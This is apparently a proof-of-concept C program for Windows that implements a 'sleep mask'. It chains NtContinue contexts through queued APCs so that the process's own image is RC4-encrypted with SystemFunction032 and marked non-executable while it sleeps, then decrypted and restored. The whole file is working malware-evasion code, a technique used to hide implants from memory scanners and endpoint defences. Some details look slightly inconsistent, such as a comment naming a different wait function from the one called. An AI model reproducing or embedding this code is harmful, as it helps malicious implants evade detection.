#include <windows.h>
#include <stdio.h>
#include <time.h>

typedef NTSTATUS (NTAPI* fnNtAlertResumeThread) (HANDLE ThreadHandle, PULONG SuspendCount);
typedef NTSTATUS (NTAPI* fnNtSignalAndWaitForSingleObject) (HANDLE ObjectToSignal, HANDLE WaitableObject, BOOLEAN Altertable, PLARGE_INTEGER Time);

typedef struct _USTRING
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING, *PUSTRING;

unsigned char* generateKey() {
    static unsigned char KeyBuf[16];
    srand(time(NULL));
    for (int i = 0; i < 16; i++) KeyBuf[i] = rand() % 256;
    return KeyBuf;
}

void SecureSleep(DWORD dwSleepTime) {
    DWORD dwTid = 0;

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    CONTEXT ctxA = {0};
    CONTEXT ctxB = {0};
    CONTEXT ctxC = {0};
    CONTEXT ctxD = {0};
    CONTEXT ctxE = {0};
    CONTEXT ctxEvent = {0};
    CONTEXT ctxEnd = {0};

    LoadLibraryA("advapi32.dll");

    PVOID pNtdllAddr = GetModuleHandleA("ntdll");
    PVOID pAdvAPI = GetModuleHandleA("Advapi32");

    printf("[i] NTDLL: %p\n", pNtdllAddr);
    printf("[i] AdvAPI: %p\n", pAdvAPI);
    
    PVOID pNtContinue = GetProcAddress(pNtdllAddr, "NtContinue");
    PVOID pNtTestAlert = GetProcAddress(pNtdllAddr, "NtTestAlert");
    PVOID pSystemFunction032 = GetProcAddress(pAdvAPI, "SystemFunction032");

    fnNtAlertResumeThread pNtAlertResumeThread = (fnNtAlertResumeThread)GetProcAddress(pNtdllAddr, "NtAlertResumeThread");
    fnNtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject = (fnNtSignalAndWaitForSingleObject)GetProcAddress(pNtdllAddr, "NtSignalAndWaitForSingleObject");

    printf("[i] NtAlertResumeThread: %p\n", pNtAlertResumeThread);
    printf("[i] NtSignalAndWaitForSingleObject: %p\n", pNtSignalAndWaitForSingleObject);
    printf("[i] NtContinue: %p\n", pNtContinue);
    printf("[i] NtTestAlert: %p\n", pNtTestAlert);
    printf("[i] SystemFunction032: %p\n", pSystemFunction032);

    unsigned char* KeyBuf = generateKey();
    USTRING Key           = { 0 };
    USTRING Img           = { 0 };

    printf("Key: ");
    for (int i = 0; i < 16; i++) printf("%02X", KeyBuf[i]);
    printf("\n");

    PVOID ImageBase = GetModuleHandleA(NULL);
    DWORD ImageSize = ( ( PIMAGE_NT_HEADERS ) ( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;

    Key.Buffer = KeyBuf;
    Key.Length = Key.MaximumLength = 16;

    Img.Buffer = ImageBase;
    Img.Length = Img.MaximumLength = ImageSize;

    HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);

    HANDLE hThread = CreateThread(NULL, 65535, (LPTHREAD_START_ROUTINE)MessageBox, 0, CREATE_SUSPENDED, &dwTid);

    if (hThread == NULL) {
        printf("CreateThread failed\n");
        return;
    } else {
        printf("CreateThread success\n");

        DWORD dwOldProtect = 0;
        DWORD dwOldProtectBis = 0;
        GetThreadContext(hThread, &ctx);

        RtlCopyMemory(&ctxA, &ctx, sizeof(CONTEXT));
        RtlCopyMemory(&ctxB, &ctx, sizeof(CONTEXT));
        RtlCopyMemory(&ctxC, &ctx, sizeof(CONTEXT));
        RtlCopyMemory(&ctxD, &ctx, sizeof(CONTEXT));
        RtlCopyMemory(&ctxE, &ctx, sizeof(CONTEXT));
        RtlCopyMemory(&ctxEvent, &ctx, sizeof(CONTEXT));
        RtlCopyMemory(&ctxEnd, &ctx, sizeof(CONTEXT));


        // ctxA -> VirtualProtect 
        ctxA.Rip = VirtualProtect;
        ctxA.Rcx = ImageBase;
        ctxA.Rdx = ImageSize;
        ctxA.R8  = PAGE_READWRITE;
        ctxA.R9  = &dwOldProtect;
        *(PULONG_PTR)ctxA.Rsp = (ULONG_PTR)pNtTestAlert;

        // ctxB -> SystemFunction032
        ctxB.Rip = pSystemFunction032;
        ctxB.Rcx = &Img;
        ctxB.Rdx = &Key;
        *(PULONG_PTR)ctxB.Rsp = (ULONG_PTR)pNtTestAlert;

        // ctxC -> NtSignalAndWaitForSingleObject
        ctxC.Rip = WaitForSingleObject;
        ctxC.Rcx = (HANDLE)-1;
        ctxC.Rdx = dwSleepTime;
        *(PULONG_PTR)ctxC.Rsp = (ULONG_PTR)pNtTestAlert;

        // ctxD -> SystemFunction032
        ctxD.Rip = pSystemFunction032;
        ctxD.Rcx = &Img;
        ctxD.Rdx = &Key;
        *(PULONG_PTR)ctxD.Rsp = (ULONG_PTR)pNtTestAlert;

        // ctxE -> VirtualProtect
        ctxE.Rip = VirtualProtect;
        ctxE.Rcx = ImageBase;
        ctxE.Rdx = ImageSize;
        ctxE.R8  = dwOldProtect;
        ctxE.R9  = &dwOldProtectBis;
        *(PULONG_PTR)ctxE.Rsp = (ULONG_PTR)pNtTestAlert;

        // ctxEvent -> SetEvent
        ctxEvent.Rip = SetEvent;
        ctxEvent.Rcx = hEvent;
        *(PULONG_PTR)ctxEvent.Rsp = (ULONG_PTR)pNtTestAlert;

        // ctxEnd -> ExitThread
        ctxEnd.Rip = ExitThread;
        ctxEnd.Rcx = 0;
        *(PULONG_PTR)ctxEnd.Rsp = (ULONG_PTR)pNtTestAlert;

        QueueUserAPC((PAPCFUNC)pNtContinue, hThread, (ULONG_PTR)&ctxA);
        QueueUserAPC((PAPCFUNC)pNtContinue, hThread, (ULONG_PTR)&ctxB);
        QueueUserAPC((PAPCFUNC)pNtContinue, hThread, (ULONG_PTR)&ctxC);
        QueueUserAPC((PAPCFUNC)pNtContinue, hThread, (ULONG_PTR)&ctxD);
        QueueUserAPC((PAPCFUNC)pNtContinue, hThread, (ULONG_PTR)&ctxE);
        QueueUserAPC((PAPCFUNC)pNtContinue, hThread, (ULONG_PTR)&ctxEvent);
        QueueUserAPC((PAPCFUNC)pNtContinue, hThread, (ULONG_PTR)&ctxEnd);

        ULONG x = 0;
        pNtAlertResumeThread(hThread, &x);
        pNtSignalAndWaitForSingleObject(hEvent, hThread, FALSE, NULL);

        TerminateThread(hThread, 0);

    }

    CloseHandle(hThread);

}

int main() {
    printf("SleepMask using APC queue\n");
    printf("Sleeping for 10 seconds\n");
    char secret[] = "salut123";
    printf("secrets addr %p\n", secret);
    printf("ready to sleep\n");
    getchar();
    printf("sleeping, memory should be encrypted\n");
    SecureSleep(100000);
    return 0;
}
